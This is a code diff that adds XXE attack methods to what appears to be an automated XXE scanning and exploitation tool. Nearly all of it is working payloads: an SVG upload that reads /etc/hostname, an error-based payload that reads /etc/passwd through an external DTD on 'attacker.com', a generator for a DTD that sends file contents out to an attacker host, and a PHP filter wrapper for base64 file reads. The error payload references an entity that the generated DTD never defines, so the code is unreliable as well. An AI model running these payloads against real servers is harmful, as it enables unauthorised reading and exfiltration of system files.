@@ -229,6 +229,87 @@ class AutoXXE:
 
         return {"tested": len(results), "results": results}
 
+    def test_svg_xxe(self) -> dict:
+        """Test XXE via SVG file upload.
+
+        SVG files are XML-based and can contain XXE payloads.
+        """
+        svg_payload = (
+            '<?xml version="1.0" standalone="yes"?>'
+            '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>'
+            '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">'
+            '<text font-size="16" x="0" y="16">&xxe;</text>'
+            '</svg>'
+        )
+
+        # Try uploading as SVG
+        try:
+            files = {'file': ('test.svg', svg_payload, 'image/svg+xml')}
+            resp = self.session.post(self.base_url, files=files, timeout=10)
+            if resp.status_code == 200 and len(resp.text) > 0:
+                self.vulnerable = True
+                self.xxe_type = "svg_upload"
+                self.findings.append({
+                    "type": "svg_xxe",
+                    "payload": svg_payload[:200],
+                })
+                return {"vulnerable": True, "technique": "svg_upload"}
+        except Exception:
+            pass
+
+        return {"vulnerable": False, "technique": "svg_upload"}
+
+    def test_error_based_xxe(self, oob_domain: str = "") -> dict:
+        """Test error-based XXE with external DTD.
+
+        Uses external DTD to force error that leaks file contents.
+        """
+        domain = oob_domain or self.oob_domain
+
+        # Error-based XXE payload
+        error_payload = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
+            '<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">'
+            '%dtd;'
+            '%send;'
+            ']>'
+            '<root>&exfil;</root>'
+        ).format(domain=domain or "attacker.com")
+
+        result = self._send_xml(error_payload)
+        if result.get("status") == 200 and "root:x:0" in result.get("body", ""):
+            self.vulnerable = True
+            self.xxe_type = "error_based"
+            return {"vulnerable": True, "technique": "error_based", "file_leaked": True}
+
+        return {"vulnerable": False, "technique": "error_based"}
+
+    def generate_external_dtd(self, oob_domain: str = "") -> str:
+        """Generate external DTD for blind XXE exfiltration.
+
+        Returns the DTD content to host on attacker's server.
+        """
+        domain = oob_domain or self.oob_domain or "attacker.com"
+        return (
+            '<!ENTITY % all "<!ENTITY exfil SYSTEM \'http://{domain}/?%file;\'>">'
+            '%all;'
+        ).format(domain=domain)
+
+    def get_php_wrapper_payload(self, file_path: str = "/etc/passwd") -> str:
+        """Get PHP wrapper XXE payload for base64-encoded file read.
+
+        Useful when direct file read is blocked by encoding issues.
+        """
+        return (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={path}">'
+            ']>'
+            '<root>&xxe;</root>'
+        ).format(path=file_path)
+
     def run_full_scan(self) -> dict:
         """Run complete automated XXE scan."""
         start = time.time()
